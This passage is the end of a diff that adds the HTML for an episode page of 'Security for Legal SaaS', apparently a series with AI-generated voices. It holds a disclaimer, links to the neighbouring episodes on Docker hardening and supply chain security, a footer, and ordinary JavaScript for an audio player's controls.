+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">&lt;Person1&gt;Security for Legal SaaS is a series written with AI assistance. Alice and Dan are AI-generated voices &mdash; no professional advice here, just education.&lt;/Person1&gt;</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">Security for Legal SaaS is a series written with AI assistance. Alice and Dan are AI-generated voices &mdash; no professional advice here, just education.</p>
+
+    </article>
+</section>
+
+<nav aria-label="Episode navigation" class="py-10">
+    <div class="flex items-center justify-between">
+        <div>
+            <a href="episode-45-docker-security-and-container-hardening.html" class="group inline-flex items-center text-ink-light hover:text-red transition-colors">
+                <svg class="w-5 h-5 mr-3 text-ink-muted group-hover:text-red transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+                </svg>
+                <div>
+                    <p class="font-sans text-sm tracking-widest uppercase text-ink-muted">Previous</p>
+                    <p class="text-lg font-semibold">Episode 45 &mdash; Docker Security and Container Hardening</p>
+                </div>
+            </a>
+        </div>
+        <div class="text-right">
+            <a href="episode-47-supply-chain-security-dependencies-sbom-and-build-provenance.html" class="group inline-flex items-center text-ink-light hover:text-red transition-colors">
+                <div class="text-right">
+                    <p class="font-sans text-sm tracking-widest uppercase text-ink-muted">Next</p>
+                    <p class="text-lg font-semibold">Episode 47 &mdash; Supply Chain Security &mdash; Dependencies, SBOM and Build Provenance</p>
+                </div>
+                <svg class="w-5 h-5 ml-3 text-ink-muted group-hover:text-red transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                </svg>
+            </a>
+        </div>
+    </div>
+</nav>
+
+    </main>
+
+    <footer class="border-t-2 border-rule-dark">
+        <div class="max-w-3xl mx-auto px-6 py-8 text-center">
+            <p class="font-sans text-xs text-ink-muted">Security for Legal SaaS &copy; 2026</p>
+        </div>
+    </footer>
+
+    <script src="../assets/js/plyr.js"></script>
+
+<script>
+    const audio = document.getElementById('player');
+    const fill = document.getElementById('progress-fill');
+    const dot = document.getElementById('progress-dot');
+    const bar = document.getElementById('progress-bar');
+    const timeEl = document.getElementById('current-time');
+    const iconPlay = document.getElementById('icon-play');
+    const iconPause = document.getElementById('icon-pause');
+
+    audio.addEventListener('play', function() {
+        iconPlay.classList.add('hidden');
+        iconPause.classList.remove('hidden');
+    });
+    audio.addEventListener('pause', function() {
+        iconPause.classList.add('hidden');
+        iconPlay.classList.remove('hidden');
+    });
+
+    audio.addEventListener('timeupdate', function() {
+        if (dragging) return;
+        const pct = (audio.currentTime / audio.duration * 100) || 0;
+        fill.style.width = pct + '%';
+        dot.style.left = pct + '%';
+        const m = Math.floor(audio.currentTime / 60);
+        const s = Math.floor(audio.currentTime % 60);
+        timeEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+    });
+
+    let dragging = false;
+    function seek(e) {
+        const rect = bar.getBoundingClientRect();
+        const pct = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
+        fill.style.width = (pct * 100) + '%';
+        dot.style.left = (pct * 100) + '%';
+        audio.currentTime = pct * audio.duration;
+    }
+    bar.addEventListener('mousedown', function(e) { dragging = true; seek(e); });
+    document.addEventListener('mousemove', function(e) { if (dragging) seek(e); });
+    document.addEventListener('mouseup', function() { dragging = false; });
+    bar.addEventListener('touchstart', function(e) { dragging = true; seek(e.touches[0]); }, {passive: true});
+    document.addEventListener('touchmove', function(e) { if (dragging) seek(e.touches[0]); });
+    document.addEventListener('touchend', function() { dragging = false; });
+</script>
+
+</body>
+</html>
